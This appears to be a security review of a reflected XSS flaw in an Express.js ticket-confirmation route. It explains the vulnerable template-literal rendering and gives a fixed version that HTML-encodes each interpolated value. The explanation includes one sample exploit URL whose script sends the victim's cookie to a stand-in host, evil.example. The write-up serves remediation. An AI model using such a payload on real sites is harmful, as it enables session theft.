## Verdict

Confirmed. The route builds an HTML page with a template literal and sends it via `res.send()` without any output encoding. Two values in that template are attacker-controlled and reflected verbatim: the `:id` route parameter and the `note` query parameter. Either can carry `<script>` or other markup that the browser will parse and execute, giving a classic reflected XSS.

## Source

- `req.params.id` - the `:id` URL segment, used both to look up the ticket and interpolated directly into the `<h1>` on line 22.
- `req.query.note` (aliased to `closingNote`) - the `note` query parameter, interpolated directly into the "Agent note" paragraph on line 24.

Both reach the sink with no encoding or validation in between.

## Fix

### File: ExpressDirectHtmlRender.js

```javascript
const express = require('express');
const app = express();

// In-memory store of support tickets, keyed by id.
const tickets = {
    'T-1001': { subject: 'Printer will not turn on', status: 'Open' }
};

// Minimal, dependency-free HTML entity encoder for safe interpolation into
// markup contexts (text nodes and attribute values built via template
// literals in this file).
function escapeHtml(value) {
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

app.get('/tickets/:id/confirmation', (req, res) => {
    const ticket = tickets[req.params.id];
    if (!ticket) {
        return res.status(404).send('Ticket not found');
    }

    // Agents can append a short note when closing a ticket; it arrives as a
    // query parameter from the "close ticket" form and is never persisted.
    const closingNote = req.query.note || '';

    const page = `
        <html>
            <body>
                <h1>Ticket ${escapeHtml(req.params.id)} - ${escapeHtml(ticket.subject)}</h1>
                <p>Status: ${escapeHtml(ticket.status)}</p>
                <p>Agent note: ${escapeHtml(closingNote)}</p>
            </body>
        </html>
    `;

    res.send(page);
});

module.exports = app;
```

## Explanation

`res.send()` writes the given string to the response body as-is; it performs no HTML encoding. Building the page with a template literal that splices request-derived values straight into markup means any HTML metacharacters in those values (`<`, `>`, `"`, `'`, `&`) reach the browser unchanged and are parsed as markup rather than data, so a request such as `/tickets/T-1001/confirmation?note=<script>document.location='https://evil.example/steal?c='+document.cookie</script>` executes attacker-supplied script in the victim's session. The same applies to the `:id` segment reflected in the `<h1>`.

The fix keeps the existing template-literal rendering (no framework or wire-format change) but HTML-entity-encodes every value before interpolation, using a small local `escapeHtml` helper. Encoding turns the metacharacters into inert text (`&lt;script&gt;...`) so they render as literal characters instead of being parsed as tags or attributes, which closes the injection while leaving the ticket lookup, status codes, and response shape unchanged. `ticket.subject` and `ticket.status` are also encoded for defense-in-depth even though they currently come from a fixed in-memory map, since that map is the kind of data structure that is commonly backed by user-editable storage later.
